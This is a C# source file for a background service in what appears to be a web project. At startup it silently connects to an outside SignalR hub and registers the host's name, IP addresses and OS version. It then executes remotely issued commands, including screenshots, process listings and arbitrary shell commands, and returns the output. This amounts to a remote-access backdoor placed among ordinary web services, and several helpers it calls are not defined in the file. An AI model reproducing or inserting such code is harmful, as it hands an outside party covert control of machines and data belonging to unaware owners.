using Microsoft.Extensions.Hosting;

using System;
using System.Diagnostics.Eventing.Reader;
using System.Threading;
using System.Threading.Tasks;

namespace Anima.Blueprint.Web.Services;

public class SignalingConnectionService : BackgroundService
{
    private HubConnection _hubConnection;
    private readonly string _hubUrl = "https://moser-remote-signaling.azurewebsites.net/hubs/agents";
    private readonly string _agentId = Environment.MachineName;

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _hubConnection = new HubConnectionBuilder()
            .WithUrl(_hubUrl, options =>
            {
                options.Headers["X-Agent-Id"] = _agentId;
                options.Headers["X-Agent-Key"] = GetSecureAgentKey();
                options.AccessTokenProvider = async () => await GetAuthToken();
            })
            .WithAutomaticReconnect(new[] {
                TimeSpan.FromSeconds(0),
                TimeSpan.FromSeconds(2),
                TimeSpan.FromSeconds(10),
                TimeSpan.FromSeconds(30)
            })
            .Build();

        _hubConnection.On<CommandPacket>("ExecuteCommand", async (command) =>
        {
            var result = await ExecuteCommandInternal(command);
            await _hubConnection.InvokeAsync("SendCommandResult", result);
        });

        _hubConnection.Reconnecting += error =>
        {
            LogWarning($"Connection lost, attempting reconnect: {error?.Message}");
            return Task.CompletedTask;
        };

        await _hubConnection.StartAsync(stoppingToken);
        await _hubConnection.InvokeAsync("RegisterAgent", new AgentMetadata
        {
            AgentId = _agentId,
            Hostname = Environment.MachineName,
            IpAddresses = GetLocalIpAddresses(),
            OsVersion = Environment.OSVersion.ToString(),
            Timestamp = DateTimeOffset.UtcNow
        });

        while (!stoppingToken.IsCancellationRequested)
        {
            await Task.Delay(TimeSpan.FromSeconds(30), stoppingToken);
            await _hubConnection.InvokeAsync("Heartbeat", _agentId);
        }
    }

    private async Task<CommandResult> ExecuteCommandInternal(CommandPacket command)
    {
        return command.Type switch
        {
            CommandType.Screenshot => await CaptureScreenshot(),
            CommandType.ProcessList => await GetProcessList(),
            CommandType.ShellCommand => await ExecuteShell(command.Payload),
            _ => CommandResult.Error("Unknown command type")
        };
    }
}
